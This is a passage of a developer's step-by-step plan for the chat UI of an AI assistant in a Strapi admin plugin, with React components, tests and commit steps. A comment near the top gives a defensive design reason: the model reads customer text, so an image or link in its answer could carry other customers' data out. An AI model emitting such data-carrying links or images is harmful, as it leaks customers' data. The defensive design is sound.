 * - The four tints that were literal black overlays are theme colours, so inline code, code blocks and table headers show in the dark theme.
 * - Lists have their markers and headings their weight. The design system's global style takes both away (`list-style: none`, `font: unset`).
 * - Images are not drawn, and only an `http:` or `https:` link is a link (see `MarkdownLink`). The model reads customer text, and an image
 *   address or a link could carry other customers' words out of the page.
 * Raw HTML in an answer is shown as text: react-markdown does not render it.
 */
const Body = styled.div`
  p { margin: 0 0 8px; &:last-child { margin-bottom: 0; } }
  ul, ol { margin: 4px 0; padding-left: 20px; }
  ul { list-style: disc; }
  ol { list-style: decimal; }
  li { margin: 2px 0; }
  code {
    font-size: 0.85em;
    padding: 1px 4px;
    border-radius: 3px;
    background: ${({ theme }) => theme.colors.neutral150};
  }
  pre {
    margin: 8px 0;
    padding: 8px 10px;
    border-radius: 6px;
    overflow-x: auto;
    font-size: 0.85em;
    background: ${({ theme }) => theme.colors.neutral150};
    code { padding: 0; background: none; }
  }
  h1, h2, h3, h4 { margin: 12px 0 4px; font-weight: 600; &:first-child { margin-top: 0; } }
  h1 { font-size: 1.3em; } h2 { font-size: 1.15em; } h3 { font-size: 1.05em; }
  blockquote {
    margin: 8px 0;
    padding-left: 12px;
    border-left: 3px solid ${({ theme }) => theme.colors.neutral300};
    opacity: 0.85;
  }
  a { color: ${({ theme }) => theme.colors.primary600}; }
  table {
    border-collapse: collapse;
    margin: 8px 0;
    font-size: 0.9em;
    width: 100%;
    overflow-x: auto;
    display: block;
  }
  th, td {
    border: 1px solid ${({ theme }) => theme.colors.neutral300};
    padding: 4px 8px;
    text-align: left;
    white-space: nowrap;
  }
  th { background: ${({ theme }) => theme.colors.neutral150}; font-weight: 600; }
`;

/**
 * A link in an answer. Only an `http:` or `https:` address is a link: it opens in a new tab and gives the page no way back to its window.
 * Anything else is its text, as plain text. react-markdown hands its own `node` to a custom component, which is left out here so it does not
 * land on the element as an attribute.
 */
const MarkdownLink = ({ href, children, node: _node, ...props }: ComponentProps<'a'> & { node?: unknown }) => {
  const address = safeLink(href);
  if (!address) return <span>{children}</span>;
  return (
    <a {...props} href={address} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
};

const components = { a: MarkdownLink } as ComponentProps<typeof Markdown>['components'];

export const MarkdownBody = ({ text }: { text: string }) => (
  // `data-message-part` is a hook for tests: it lets a check read the rendered answer and nothing else in the message.
  <Body data-message-part="text">
    <Markdown remarkPlugins={[remarkGfm]} components={components} disallowedElements={['img']}>
      {text}
    </Markdown>
  </Body>
);
```

Create `admin/src/components/assistant/ToolBox.tsx`:

```tsx
import { useState } from 'react';

import styled from 'styled-components';

import type { ToolBoxModel } from '../../assistant';

/**
 * One tool call in the chat: a box with a header that opens and closes it, copied from strapi-plugin-tanstack-ai 1.6.0
 * (`ToolCallDisplay.tsx`), without its links to the Content Manager. Closed at first, even while the call runs.
 * - The header shows "Tool: <name>", and at the right a spinner while it runs, then the count ("3 results", "1 result" or "done"), or "failed".
 * - Opened, the body shows the wait, the failure's message, or the result as JSON with the customer-text tags taken out (`toolBoxOf`).
 * - A failed box is marked: a danger border and "failed" in the danger colour. The reference shows only a faint word, and that is not
 *   copied: failures need to be easy to see.
 */
const Frame = styled.div<{ $failed: boolean }>`
  margin-top: 8px;
  border: 1px solid ${({ $failed, theme }) => ($failed ? theme.colors.danger200 : theme.colors.neutral200)};
  border-radius: 8px;
  overflow: hidden;
  font-size: 13px;
`;

const Header = styled.button`
  display: flex;
  align-items: center;
  gap: 6px;
  width: 100%;
  padding: 8px 12px;
  background: ${({ theme }) => theme.colors.neutral150};
  border: none;
  cursor: pointer;
  font-size: 12px;
  font-weight: 600;
  color: ${({ theme }) => theme.colors.neutral800};
  text-align: left;

  &:hover {
    background: ${({ theme }) => theme.colors.neutral200};
  }
`;

const Status = styled.span<{ $failed: boolean }>`
  margin-left: auto;
  font-weight: 400;
  ${({ $failed, theme }) => ($failed ? `color: ${theme.colors.danger600};` : 'opacity: 0.6;')}
`;

const Spinner = styled.span`
  display: inline-block;
  width: 12px;
  height: 12px;
  border: 2px solid ${({ theme }) => theme.colors.neutral300};
  border-top-color: ${({ theme }) => theme.colors.primary600};
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-left: auto;
  flex-shrink: 0;

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  @media (prefers-reduced-motion: reduce) {
    animation: none;
  }
`;

const Content = styled.pre`
  margin: 0;
  padding: 8px 12px;
  background: ${({ theme }) => theme.colors.neutral100};
  color: ${({ theme }) => theme.colors.neutral800};
  font-size: 11px;
  line-height: 1.4;
  overflow-x: auto;
  max-height: 200px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-word;
`;

export const ToolBox = ({ box }: { box: ToolBoxModel }) => {
  const [open, setOpen] = useState(false);
  const failed = box.state === 'failed';

  return (
    <Frame $failed={failed} data-message-part="tool" data-state={box.state}>
      <Header type="button" onClick={() => setOpen(!open)} aria-expanded={open}>
        <span aria-hidden="true">{open ? '▼' : '▶'}</span>
        <span>Tool: {box.name}</span>
        {box.state === 'running' ? <Spinner aria-label="running" /> : <Status $failed={failed}>{box.status}</Status>}
      </Header>
      {open && <Content>{box.body}</Content>}
    </Frame>
  );
};
```

- [ ] **Step 4: Write the message list**

`MessageList.tsx` is the reference's `MessageList` (the bubbles, the avatar, the labels, the dots), with these changes: the parts of a message are drawn in the order they arrived, staff text is plain text with its line breaks (`StaffText`), a message with nothing to draw is skipped, the dots come from `showsWorking` and "Working on it…" from `showsToolWait`, and the list follows the newest message by Maison's rule (`followsNewest`), with no smooth scrolling and no `scrollIntoView`.

Create `admin/src/components/assistant/MessageList.tsx`:

```tsx
import { useEffect, useRef } from 'react';

import { Sparkle } from '@strapi/icons';
import type { UIMessage } from '@tanstack/ai-client';
import styled from 'styled-components';

import { drawableParts, followsNewest, showsToolWait, showsWorking, toolBoxOf, toolResultOf, type PartLike } from '../../assistant';
import { EmptyState } from './EmptyState';
import { MarkdownBody } from './MarkdownBody';
import { ToolBox } from './ToolBox';

/**
 * The messages of the chat, copied from strapi-plugin-tanstack-ai 1.6.0 (`MessageList.tsx`): staff on the right in a primary bubble, the
 * assistant on the left in a grey one with the Sparkle avatar outside it, each starting with its label. Colours are the theme's.
 *
 * What differs from the reference, on purpose:
 * - The parts of a message are drawn in the order they arrived: text, a tool box, more text. The reference joins all the text and puts
 *   the boxes after it.
 * - A message with nothing to draw is not drawn, so a turn that failed or is still thinking leaves no empty bubble.
 * - The waiting dots come from `showsWorking`, and show once in their own row, which also covers the wait before the first words come.
 * - The list follows the newest message only while the reader is at the bottom: no smooth scrolling and no scrollIntoView.
 */

const Scroller = styled.div`
  flex: 1;
  min-height: 0;
  overflow-y: auto;
  padding: 24px;
  display: flex;
  flex-direction: column;
  gap: 12px;
`;

const Row = styled.div<{ $isUser: boolean }>`
  display: flex;
  align-items: flex-end;
  gap: 8px;
  align-self: ${({ $isUser }) => ($isUser ? 'flex-end' : 'flex-start')};
  max-width: 80%;
`;

const Avatar = styled.div`
  width: 28px;
  height: 28px;
  border-radius: 50%;
  background: ${({ theme }) => theme.colors.primary600};
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;

  svg {
    width: 16px;
    height: 16px;
    fill: ${({ theme }) => theme.colors.neutral0};
  }
`;

const Bubble = styled.div<{ $isUser: boolean }>`
  min-width: 0;
  background-color: ${({ $isUser, theme }) => ($isUser ? theme.colors.primary600 : theme.colors.neutral100)};
  color: ${({ $isUser, theme }) => ($isUser ? theme.colors.neutral0 : theme.colors.neutral800)};
  border-radius: ${({ $isUser }) => ($isUser ? '16px 16px 4px 16px' : '16px 16px 16px 4px')};
  padding: 12px 16px;
  font-size: 15px;
  word-break: break-word;
  line-height: 1.6;
`;

const Role = styled.div<{ $isUser: boolean }>`
  font-size: 11px;
  font-weight: 600;
  margin-bottom: 4px;
  opacity: 0.7;
  color: ${({ $isUser, theme }) => ($isUser ? theme.colors.neutral0 : theme.colors.neutral600)};
`;

/** Staff text, with its line breaks: the text box holds several lines. A long word wraps instead of widening the bubble. */
const StaffText = styled.div`
  white-space: pre-wrap;
  overflow-wrap: anywhere;
`;

const TypingDots = styled.span`
  display: inline-flex;
  gap: 4px;

  span {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: ${({ theme }) => theme.colors.neutral400};
    animation: bounce 1.4s infinite ease-in-out both;
  }
  span:nth-child(1) { animation-delay: 0s; }
  span:nth-child(2) { animation-delay: 0.2s; }
  span:nth-child(3) { animation-delay: 0.4s; }

  @keyframes bounce {
    0%, 80%, 100% { transform: scale(0.4); opacity: 0.4; }
    40% { transform: scale(1); opacity: 1; }
  }

  @media (prefers-reduced-motion: reduce) {
    span { animation: none; opacity: 0.6; }
  }
`;

const ToolWait = styled.div`
  display: flex;
  align-items: center;
  gap: 6px;
  margin-top: 8px;
  padding: 6px 0;
  font-size: 12px;
  color: ${({ theme }) => theme.colors.neutral600};
`;

const WaitSpinner = styled.span`
  display: inline-block;
  width: 14px;
  height: 14px;
  border: 2px solid ${({ theme }) => theme.colors.neutral300};
  border-top-color: ${({ theme }) => theme.colors.primary600};
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  flex-shrink: 0;

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  @media (prefers-reduced-motion: reduce) {
    animation: none;
  }
`;

interface MessageListProps {
  messages: readonly UIMessage[];
  /** Whether an answer is on its way. */
  busy: boolean;
  /** A starter in the empty state was pressed. */
  onStarter: (text: string) => void;
  /** Whether a send of this text would work now: a starter that would not is switched off. */
  canStart: (text: string) => boolean;
}

export const MessageList = ({ messages, busy, onStarter, canStart }: MessageListProps) => {
  const list = useRef<HTMLDivElement>(null);
  // Whether the list follows the newest message. It does until the reader scrolls up.
  const following = useRef(true);
  const first = messages[0];
  const last = messages.at(-1);

  // A different chat (another one opened, or a new one) starts at its end, and so does a chat staff have just sent a message in.
  useEffect(() => {
    following.current = true;
  }, [first?.id]);
  useEffect(() => {
    if (last?.role === 'user') following.current = true;
  }, [last?.id, last?.role]);

  // The newest message comes into view as the answer streams in. Only the list scrolls, never the page.
  useEffect(() => {
    const element = list.current;
    if (element && following.current) element.scrollTop = element.scrollHeight;
  }, [messages, busy]);

  const working = showsWorking(busy, messages);
  const toolWait = showsToolWait(busy, messages);

  return (
    <Scroller
      ref={list}
      role="region"
      aria-label="Chat messages"
      // Keyboard users scroll the list with the arrow keys once it has the focus.
      tabIndex={0}
      onScroll={(event) => {
        following.current = followsNewest(event.currentTarget);
      }}
    >
      {messages.length === 0 && <EmptyState onStarter={onStarter} canStart={canStart} />}

      {messages.map((message, index) => {
        const parts = message.parts as readonly PartLike[];
        const drawn = drawableParts(parts);
        if (drawn.length === 0) return null;
        const fromStaff = message.role === 'user';

        return (
          // `data-message-role` is a hook for tests, as in the reference: it lets a check read one side of the chat.
          <Row key={message.id} data-message-role={message.role} $isUser={fromStaff}>
            {!fromStaff && (
              <Avatar aria-hidden="true">
                <Sparkle />
              </Avatar>
            )}
            <Bubble $isUser={fromStaff}>
              <Role $isUser={fromStaff}>{fromStaff ? 'You' : 'Assistant'}</Role>
              {drawn.map((part, partIndex) => {
                if (part.type === 'text') return fromStaff ? <StaffText key={partIndex}>{part.content}</StaffText> : <MarkdownBody key={partIndex} text={part.content} />;
                const box = toolBoxOf(part, toolResultOf(parts, part.id));
                return box ? <ToolBox key={part.id} box={box} /> : null;
              })}
              {toolWait && index === messages.length - 1 && (
                <ToolWait role="status">
                  <WaitSpinner />
                  Working on it…
                </ToolWait>
              )}
            </Bubble>
          </Row>
        );
      })}

      {working && (
        <Row data-message-role="assistant" $isUser={false}>
          <Avatar aria-hidden="true">
            <Sparkle />
          </Avatar>
          <Bubble $isUser={false}>
            <Role $isUser={false}>Assistant</Role>
            <TypingDots role="status" aria-label="Assistant is replying">
              <span />
              <span />
              <span />
            </TypingDots>
          </Bubble>
        </Row>
      )}
    </Scroller>
  );
};
```

- [ ] **Step 5: Use the list in the Ask tab, and delete the two components it replaces**

`AskTab.tsx`: the message box, its scrolling and the line "The assistant is working…" are gone, because the list and its dots do that now. The old text box, its buttons, the error text and the note stay for Task 5.

```diff
@@
 import * as React from 'react';
 
 import { Box, Button, Flex, Textarea, Typography } from '@strapi/design-system';
-import styled from 'styled-components';
 
-import { askTabState, canSend, composerButtons, followsNewest, shouldSendOnKey, showsWorking, type MessageSource } from '../../assistant';
+import { askTabState, canSend, composerButtons, shouldSendOnKey, type MessageSource } from '../../assistant';
 import { ChatArea } from './ChatArea';
-import { ChatMessages } from './ChatMessages';
-import { EmptyState } from './EmptyState';
+import { MessageList } from './MessageList';
 import { useAssistant } from './AssistantProvider';
-
-/** The messages scroll in their own box, which takes the height between the top bar and the text box. */
-const MessageBox = styled.div`
-  display: flex;
-  flex-direction: column;
-  flex: 1;
-  min-height: 0;
-  overflow-y: auto;
-  padding: 24px;
-`;
 
 /**
  * The Ask tab: a chat for staff about requests, questions and inquiries. The chat itself, and the text staff have typed and not
@@
 export const AskTab = () => {
   const assistant = useAssistant();
   const box = React.useRef<HTMLTextAreaElement>(null);
-  const list = React.useRef<HTMLDivElement>(null);
-  // Whether the message box follows the newest message. It does until the reader scrolls up, and again after a send.
-  const following = React.useRef(true);
-  const messages = assistant?.messages;
-
-  // The newest message comes into view as the answer streams in. Only the message box scrolls, never the page.
-  React.useEffect(() => {
-    const element = list.current;
-    if (element && following.current) element.scrollTop = element.scrollHeight;
-  }, [messages]);
 
   if (!assistant) return <Typography textColor="neutral600">The assistant is not available for your role.</Typography>;
 
@@
 
   const submit = (message: string, source: MessageSource) => {
     if (!canSend({ text: message, busy, ready })) return;
-    following.current = true;
     void assistant.send(message, source);
     // A starter's button goes when the chat starts, and a clicked Send is switched off while the answer comes: the text box keeps the focus.
     box.current?.focus();
@@
       newChatOffered={notice?.newChat === true}
       onNewChat={assistant.newChat}
     >
-      <MessageBox
-        ref={list}
-        role="region"
-        aria-label="Chat messages"
-        // Keyboard users scroll the box with the arrow keys once it has the focus.
-        tabIndex={0}
-        onScroll={(event: React.UIEvent<HTMLDivElement>) => {
-          following.current = followsNewest(event.currentTarget);
-        }}
-      >
-        {assistant.messages.length === 0 ? <EmptyState onStarter={(starter) => submit(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} /> : <ChatMessages messages={assistant.messages} />}
-      </MessageBox>
+      <MessageList messages={assistant.messages} busy={busy} onStarter={(starter) => submit(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} />
 
       <Flex direction="column" alignItems="stretch" gap={3} padding={4}>
-        {showsWorking(busy, assistant.messages) && (
-          <Typography role="status" textColor="neutral600">
-            The assistant is working…
-          </Typography>
-        )}
         {notice && (
           <Typography role="alert" textColor="danger600">
             {notice.text}
```

Delete the two components `MessageList` and `ToolBox` replace. Nothing imports them any more.

```bash
rm admin/src/components/assistant/ChatMessages.tsx admin/src/components/assistant/ToolLine.tsx
```

- [ ] **Step 6: Run the tests, then everything**

Run: `npm test -- test/unit/markdown-body.test.tsx test/unit/tool-box.test.tsx test/unit/message-list.test.tsx`
Expected: PASS, `Test Files  3 passed (3)` and `Tests  60 passed (60)`.

Run: `npm test`
Expected: PASS, `Test Files  104 passed (104)` and `Tests  2995 passed (2995)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 7: (Paul) Look at it in the browser**

Skip this step and say so in the report. Paul runs it with the checklist in Task 8: the bubbles, the avatar and the labels in the light and the dark theme, a table in an answer, a link, a tool box opened and closed, a failed box in red, and the dots while an answer comes.

- [ ] **Step 8: Prove the tests can fail**

Make each change, run the files named, see them fail, and undo the change.

In `MarkdownBody.tsx`, draw images: delete ` disallowedElements={['img']}`.

Run: `npm test -- test/unit/markdown-body.test.tsx`
Expected: FAIL, among others: `MarkdownBody > does not draw an image: nothing is fetched, and nothing is left where it was`.

In `MarkdownLink`, accept every address: `const address = href ?? null;`.

Run: `npm test -- test/unit/markdown-body.test.tsx`
Expected: FAIL, among others: `MarkdownBody > draws an http or https link that opens in a new tab and keeps the window to itself`; `MarkdownBody > shows the text of a link to mailto:staff@example.com as plain text, with no link`; `MarkdownBody > shows the text of a link to /relative/path as plain text, with no link`.

In the `table` rule of `MarkdownBody.tsx`, delete the two lines `overflow-x: auto;` and `display: block;`.

Run: `npm test -- test/unit/markdown-body.test.tsx`
Expected: FAIL, among others: `MarkdownBody > wide content > scrolls a wide table sideways inside its bubble: the table is a block with its own overflow, so it never widens the chat`.

In `ToolBox.tsx`, give a failed box the border of any other: replace `($failed ? theme.colors.danger200 : theme.colors.neutral200)` with `theme.colors.neutral200`.

Run: `npm test -- test/unit/tool-box.test.tsx`
Expected: FAIL, among others: `ToolBox > a failed call > is marked: a danger border and the word "failed" in the danger colour, where a finished box has neither`.

In `toolBoxOf` in `admin/src/assistant.ts`, leave the tags in: `body: JSON.stringify(outputOf(call, result), null, 2) ?? '',`.

Run: `npm test -- test/unit/tool-box.test.tsx`
Expected: FAIL, among others: `ToolBox > opens to the result as indented JSON with the customer-text tags taken out, and closes again`.

In `MessageList.tsx`, draw staff text as Markdown too: `return <MarkdownBody key={partIndex} text={part.content} />;`.

Run: `npm test -- test/unit/message-list.test.tsx`
Expected: FAIL, among others: `the messages > keeps the line breaks of a staff message, and wraps a long word instead of widening the bubble`; `the messages > draws a staff message as text, never as Markdown: what staff type is what they sent`.

In `MessageList.tsx`, always scroll to the end: `if (element) element.scrollTop = element.scrollHeight;`.

Run: `npm test -- test/unit/message-list.test.tsx`
Expected: FAIL, among others: `scrolling > lets a reader who has scrolled up read on: the answer does not pull them down`.

In `MessageList.tsx`, show the dots whenever an answer is on its way: `{busy && (`.

Run: `npm test -- test/unit/message-list.test.tsx`
Expected: FAIL, among others: `waiting > shows no dots once words or a tool box are on the screen: that is the sign of work`; `waiting > shows "Working on it…" under the tool boxes while a tool runs below text that has already come`.

- [ ] **Step 9: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatMessages.tsx strapi/src/plugins/maison/admin/src/components/assistant/MarkdownBody.tsx strapi/src/plugins/maison/admin/src/components/assistant/MessageList.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolBox.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolLine.tsx strapi/src/plugins/maison/test/unit/markdown-body.test.tsx strapi/src/plugins/maison/test/unit/message-list.test.tsx strapi/src/plugins/maison/test/unit/tool-box.test.tsx
git commit -m "maison: the Ask tab's messages: bubbles, Markdown, tool boxes and the waiting dots" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatMessages.tsx strapi/src/plugins/maison/admin/src/components/assistant/MarkdownBody.tsx strapi/src/plugins/maison/admin/src/components/assistant/MessageList.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolBox.tsx strapi/src/plugins/maison/admin/src/components/assistant/ToolLine.tsx strapi/src/plugins/maison/test/unit/markdown-body.test.tsx strapi/src/plugins/maison/test/unit/message-list.test.tsx strapi/src/plugins/maison/test/unit/tool-box.test.tsx
```


---

### Task 5: The composer, the error box and the set-up notice

**Group:** Step 1b, the last task of it. After this task the whole Ask tab looks and works like the reference's chat, with Maison's rules, and the old text box, buttons and error text are gone. `AskTab` becomes the page that joins the pieces.

Read first: the spec's rebuild section ("The composer", "Errors"); the map's sections 1.8, 1.9, 3.2 (`ChatInput`, the error box, `SetupNotice`), 3.3 (change 6), 4.10 and 4.11; R/`admin/src/components/ChatInput.tsx:15-61`, R/`admin/src/components/ChatPanel.tsx:312-316` (the red box) and R/`admin/src/pages/HomePage.tsx:84-95` (`SetupNotice`). Code: `admin/src/components/assistant/AskTab.tsx` (what it draws now), `admin/src/assistant.ts` (`askTabState`, `canSend`, `composerButtons`, `shouldSendOnKey`, `errorNotice`, `ErrorNotice`), and `AssistantProvider.tsx` (the API the tab reads; it does not change in this task). In the design system: `Textarea`, `Button` (size `L`, variant `danger-light`, `startIcon`) and `Loader`.

**Files:**
- Create: `admin/src/components/assistant/Composer.tsx`, `ErrorBox.tsx`, `SetupNotice.tsx`
- Modify: `admin/src/components/assistant/AskTab.tsx`
- Test: create `test/unit/composer.test.tsx`, `test/unit/setup-notice.test.tsx`, `test/unit/ask-tab.test.tsx`

**Interfaces:**
- Consumes: `canSend`, `composerButtons`, `shouldSendOnKey`, `askTabState` and `MessageSource` (`admin/src/assistant.ts`); `useAssistant()` and its API (`status`, `statusError`, `ready`, `messages`, `busy`, `notice`, `note`, `draft`, `setDraft`, `send`, `stop`, `newChat`, `recheck`); `ChatArea` (Task 3), `MessageList` (Task 4); `renderInTheme` (Task 1).
- Produces:
  ```tsx
  // Composer.tsx: one row with a line on top: the text box on the left, Send and Stop on the right.
  export const Composer: (props: {
    draft: string; onDraft: (text: string) => void;   // the text in the box is kept in the provider
    busy: boolean; ready: boolean;
    onSend: (text: string) => void;                    // only called when canSend is true
    onStop: () => void;
    textareaRef: RefObject<HTMLTextAreaElement>;       // the page puts the focus back here after a send
  }) => JSX.Element;
  // ErrorBox.tsx
  export const ErrorBox: (props: { children: ReactNode }) => JSX.Element;   // role="alert", danger100 and danger600
  export const NoteBox: (props: { children: ReactNode }) => JSX.Element;    // role="status", grey, the same place and shape
  // SetupNotice.tsx
  export const SetupNotice: (props: { title?: string; tone?: 'neutral' | 'danger'; children: ReactNode; onCheckAgain: () => void }) => JSX.Element;
  ```
- Rules the tab keeps, each pinned by a test below: Enter sends, Shift+Enter adds a line, and the Enter that confirms a Japanese conversion sends nothing (`shouldSendOnKey`, which Task 5 does not change); Send and Stop are two buttons side by side, so a double click on Send lands on a switched-off Send and never on Stop; the text box keeps the focus after a send; the typed text and the chat stay when staff look at another tab; a failed turn takes its question back into the box and shows its error in a red alert; Stop shows no error.
- Decisions made here: the text box is the design system's `Textarea` with `rows={1}`, a minimum height of 4rem (one line) and a maximum of 13.6rem (six lines), no resize handle, and a height that follows its content up to that cap; it scrolls by itself beyond six lines. Its accessible name is "Chat message" and its placeholder "Type your message...", as in the spec. The box stays usable while an answer comes: only Send waits. The line about how a turn ended ("The assistant stopped after 6 steps...", the provider's `note`) has no counterpart in the reference, so it is a grey `NoteBox` in the same place as the red box, and it is a status, not an alert. A failed status check uses `SetupNotice` without a title and in the danger colour, with Check again.

**Review Focus covered here:** 5. Japanese typed with a conversion (the Enter that confirms it sends nothing, including the `keyCode` 229 that Safari reports), a long message (the box grows to six lines and then scrolls, and its size is pinned in CSS because jsdom lays nothing out). Pinned in `composer.test.tsx` by `Enter > sends nothing while an input method composes: the Enter that confirms a conversion is not a send`, `Enter > sends nothing for keyCode 229, ...`, `the text box > is one line tall at least and six lines tall at most, and stays that size: the staff cannot drag it` and `the text box > grows with what is typed: its height follows its content`.

- [ ] **Step 1: Write the failing tests**

`composer.test.tsx` tests the text box, Enter, Send and Stop on their own, with the key events a browser sends. `setup-notice.test.tsx` tests the set-up notice, the red box and the grey note. `ask-tab.test.tsx` tests the whole tab over the real `AssistantProvider` with `useChat` and the real connection adapter, over stand-ins for Strapi's fetch client (the status call) and for `fetch` (the chat stream): nothing reaches a server or a model. It is the file Task 7 extends with saved chats.

Create `test/unit/composer.test.tsx`:

```tsx
// @vitest-environment jsdom
import { createRef } from 'react';

import { fireEvent, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { Composer } from '../../admin/src/components/assistant/Composer';
import { renderInTheme } from './render';

const composer = (props: Partial<Parameters<typeof Composer>[0]> = {}) => (
  <Composer draft="Which visits are waiting?" onDraft={() => {}} busy={false} ready onSend={() => {}} onStop={() => {}} textareaRef={createRef<HTMLTextAreaElement>()} {...props} />
);
const box = () => screen.getByRole('textbox', { name: 'Chat message' }) as HTMLTextAreaElement;
const send = () => screen.getByRole('button', { name: 'Send' }) as HTMLButtonElement;

/** The rules styled-components wrote for an element: every rule in the document that starts with one of its classes. */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

describe('the text box', () => {
  it('is a multi-line box named "Chat message", with the placeholder "Type your message...", one row tall at first', () => {
    renderInTheme(composer({ draft: '' }));
    expect(box().tagName).toBe('TEXTAREA');
    expect(box().getAttribute('placeholder')).toBe('Type your message...');
    expect(box().getAttribute('rows')).toBe('1');
  });

  it('shows the draft, and tells the page what staff type', async () => {
    const onDraft = vi.fn();
    renderInTheme(composer({ draft: '', onDraft }));
    await userEvent.type(box(), 'Hi');
    expect(onDraft).toHaveBeenCalledTimes(2);
    expect(onDraft.mock.calls.map(([value]) => value)).toEqual(['H', 'i']);
    expect(box().value).toBe('');
  });

  it('is the element the page is given, so it can put the focus back after a send', () => {
    const textareaRef = createRef<HTMLTextAreaElement>();
    renderInTheme(composer({ textareaRef }));
    expect(textareaRef.current).toBe(box());
  });

  it('stays usable while an answer comes: only Send waits', () => {
    renderInTheme(composer({ busy: true }));
    expect(box().disabled).toBe(false);
  });

  // A textarea scrolls by itself once its content is taller than its box, so the cap is the whole rule: one line at least, six at most.
  it('is one line tall at least and six lines tall at most, and stays that size: the staff cannot drag it', () => {
    renderInTheme(composer({ draft: '' }));
    const css = cssOf(box());
    expect(css).toContain('min-height:4rem');
    expect(css).toContain('max-height:13.6rem');
    expect(css).toContain('resize:none');
  });

  it('grows with what is typed: its height follows its content', () => {
    Object.defineProperty(HTMLTextAreaElement.prototype, 'scrollHeight', { configurable: true, get: () => 88 });
    try {
      const view = renderInTheme(composer({ draft: '' }));
      expect(box().style.height).toBe('88px');
      view.rerender(composer({ draft: 'one\ntwo\nthree\nfour' }));
      expect(box().style.height).toBe('88px');
    } finally {
      delete (HTMLTextAreaElement.prototype as { scrollHeight?: number }).scrollHeight;
    }
  });
});

describe('Enter', () => {
  it('sends the draft', () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    expect(fireEvent.keyDown(box(), { key: 'Enter', keyCode: 13 })).toBe(false);
    expect(onSend).toHaveBeenCalledExactlyOnceWith('Which visits are waiting?');
  });

  it('adds a line break and sends nothing with Shift', () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    expect(fireEvent.keyDown(box(), { key: 'Enter', shiftKey: true })).toBe(true);
    expect(onSend).not.toHaveBeenCalled();
  });

  // Staff typing Japanese press Enter to confirm a conversion. That Enter belongs to the input method.
  it('sends nothing while an input method composes: the Enter that confirms a conversion is not a send', () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    fireEvent.keyDown(box(), { key: 'Enter', isComposing: true });
    fireEvent.keyDown(box(), { key: 'Enter', isComposing: true, keyCode: 229 });
    expect(onSend).not.toHaveBeenCalled();
  });

  it('sends nothing for keyCode 229, which Safari reports for the Enter that ends a composition after it has stopped composing', () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    fireEvent.keyDown(box(), { key: 'Enter', isComposing: false, keyCode: 229 });
    expect(onSend).not.toHaveBeenCalled();
  });

  it('sends nothing for any other key', () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    for (const key of ['a', ' ', 'Tab', 'Escape', 'ArrowUp']) fireEvent.keyDown(box(), { key });
    expect(onSend).not.toHaveBeenCalled();
  });

  it('adds no line break when there is nothing to send: an empty box, a box with only spaces, or an answer on its way', () => {
    const onSend = vi.fn();
    for (const props of [{ draft: '' }, { draft: '  \n ' }, { busy: true }, { ready: false }]) {
      const { unmount } = renderInTheme(composer({ onSend, ...props }));
      expect(fireEvent.keyDown(box(), { key: 'Enter' }), JSON.stringify(props)).toBe(false);
      unmount();
    }
    expect(onSend).not.toHaveBeenCalled();
  });
});

describe('Send', () => {
  it('is a button that sends the draft', async () => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend }));
    await userEvent.click(send());
    expect(onSend).toHaveBeenCalledExactlyOnceWith('Which visits are waiting?');
  });

  it.each([
    ['the box is empty', { draft: '' }],
    ['the box has only spaces', { draft: '   ' }],
    ['an answer is on its way', { busy: true }],
    ['the assistant is not ready', { ready: false }],
  ])('is switched off, and sends nothing, when %s', async (_why, props) => {
    const onSend = vi.fn();
    renderInTheme(composer({ onSend, ...props }));
    expect(send().disabled).toBe(true);
    await userEvent.click(send());
    expect(onSend).not.toHaveBeenCalled();
  });

  it('has no Stop while nothing is answering', () => {
    renderInTheme(composer());
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull();
  });
});

describe('Stop', () => {
  it('shows beside Send while an answer comes, and stops it', async () => {
    const onStop = vi.fn();
    const onSend = vi.fn();
    renderInTheme(composer({ busy: true, onStop, onSend }));
    const stop = screen.getByRole('button', { name: 'Stop' }) as HTMLButtonElement;
    expect(send().disabled).toBe(true);
    expect(Boolean(send().compareDocumentPosition(stop) & Node.DOCUMENT_POSITION_FOLLOWING)).toBe(true);
    await userEvent.click(stop);
    expect(onStop).toHaveBeenCalledOnce();
    // Inside the form a submit button would send the draft instead of stopping the answer.
